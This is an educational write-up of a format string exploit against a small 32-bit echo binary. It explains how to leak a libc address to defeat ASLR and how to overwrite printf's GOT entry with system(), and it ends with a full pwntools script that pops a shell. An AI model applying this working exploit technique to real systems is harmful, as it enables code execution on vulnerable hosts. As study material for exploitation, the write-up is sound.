---
title: Simple Echo - Format String Vulnerability Exploitation
slug: simple-echo
published: 2022-10-16
author: kako57
description: Exploitation of a format string vulnerability with ASLR enabled
---

## About the binary

[Link to binary](/files/simple-echo/simple_echo)

This binary was sent to me by a friend, asking me if it can be exploited.
He told me that the vulnerability doesn't seem to be a buffer overflow,
and that he didn't find any other ways to attack it.

---

## Initial Exploration

Let's see what kind of binary we're working on.

```
$ file simple_echo
simple_echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=208d64568158fab20eff47c6bc1351e3557076d0, not stripped
$ pwn checksec simple_echo
[*] '/path/to/simple_echo'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

It's nice to see that the binary is dynamically linked and is not stripped.
This helps taking less time on reversing the binary (hopefully)
and have more time figuring out the exploit.

## Reversing the binary

The `main` function simply calls a function named `cat` after a setvbuf

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  cat();
  return 0;
}
```

And `cat` goes in a loop, where it reads stdin, stores to buffer, then prints out the buffer for every read using a `printf`.

```c
ssize_t cat()
{
  ssize_t result; // eax
  char format[256]; // [esp+Ch] [ebp-10Ch] BYREF
  ssize_t v2; // [esp+10Ch] [ebp-Ch]

  v2 = 0;
  while ( 1 )
  {
    result = read(0, format, 0xFFu);
    v2 = result;
    if ( result <= 0 )
      break;
    format[v2] = 0;
    printf(format);
  }
  return result;
}
```

And for `printf`, it's a jump to an address that is to be provided after loading libc.
This is because the implementation for printf is loaded dynamically.

```asm
  jmp     *0x804A010
```

## Strategy

We know how we can use printf to peek the values on the stack, and to write stuff.

Now with these techniques in mind, we want to have some strategy
when writing our exploit.

Fundamental Goal: have power on where we can write with `%n` and be able to compute how many characters to print.

Ultimate Goal: Overwrite address of printf in got so it goes to system instead, making the program
an interactive shell, basically.

1. We can use the **buffer** used by read. That's actually plenty of space! We will write the addresses we will overwrite there, and we will put the format string payload there as well.
2. We need to find where the buffer is on the stack. Recall accessing nth argument of printf.
3. Enter the addresses for the half-byte overwrites
4. Compute the number of chars to print for one half of the 4 bytes then overwrite.
5. Compute the number of chars to print for the other half of the 4 bytes then overwrite.
6. Any lines to be entered from here on should be passed to system() instead of printf()

### Defeating Address Space Layout Randomization (ASLR)

Modern computers use address space layout randomization (ASLR) for loading dynamically
linked libraries. Because libc is one such library, the loaded addresses
for the libc functions we see during debugging actually don't necessarily show up
when we run the binary without debugging. They get randomized!
How can we defeat ASLR to have a consistent exploit?

We still have a good amount of control over the program with the format string vulnerability.
In fact, our control is so strong we can still determine where in the memory
a libc function is during runtime.
We can look up the offset of that libc function in the libc file being loaded,
and figure out the libc base address after being loaded dynamically, leaking the whole of libc
overall, as we can map all the other libc functions during runtime.

To have a consistent exploit, we leak the libc base address using the
format string vulnerability before we proceed to overwriting addresses.

## Exploit code

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./simple_echo")
p = binary.process()

# ====== LEAK =======

libc_start_main_reloc = 0x0804a014 # where pointer to libc_start_main is stored

# libc function offsets (this varies depending on the system's libc; find it yourself)
libc_start_main_offset = 0x0001f170 # for leaking libc address
system_offset = 0x00049680          # our target value

exploit = b""
exploit += p32(libc_start_main_reloc)
exploit += b"%7$4s"

log.info("leaking libc address")
log.info("Leak payload: %s" % repr(exploit))

p.sendline(exploit)
p.recv(4) # we don't need this (this is just an echo of libc_start_main_reloc)
leak = u32(p.recv(4)) # get the next four-byte chunk (this is the leaked address)
p.recvline() # the rest is junk to us
libc_base = leak - libc_start_main_offset

log.info("libc is leaked! base address: %s" % hex(libc_base))

# ====== OVERWRITE =======

printf_reloc = 0x0804A010 # this is where we will overwrite

# we can now figure out where system() will be
system = libc_base + system_offset

# for overwriting lower two bytes
lower_half_adjustment = ((system & 0xffff) - 8)

exploit = b""
exploit += p32(printf_reloc)
exploit += p32(printf_reloc + 2)
exploit += b"%7$" + b"%dx" % lower_half_adjustment
exploit += b"%7$hn"

# for overwriting upper two bytes
upper_half_adjustment = (system >> 16) - lower_half_adjustment - 8

exploit += b"%8$" + b"%dx" % upper_half_adjustment
exploit += b"%8$hn"

log.info("overwrite payload: %s", repr(exploit))

p.sendline(exploit)
p.recvline()
log.info("overwrite payload sent. getting shell now weeeeee.")
log.info("note: Ctrl+C or Ctrl+D to close")

p.interactive()
```
